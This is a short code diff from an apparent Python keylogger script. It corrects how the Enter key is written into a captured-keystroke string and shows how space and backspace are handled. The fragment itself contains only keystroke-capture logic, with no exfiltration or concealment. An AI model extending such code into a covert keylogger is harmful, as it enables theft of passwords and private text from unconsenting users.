@@ -19,7 +19,7 @@ def key_logging(key):
     
     #taking care of some special characters
     if key == keyboard.Key.enter:
-        keylog += "/n"
+        keylog += "\n"
     elif key == keyboard.Key.space:
         keylog += " "
     elif key == keyboard.Key.backspace and len(keylog) > 0:
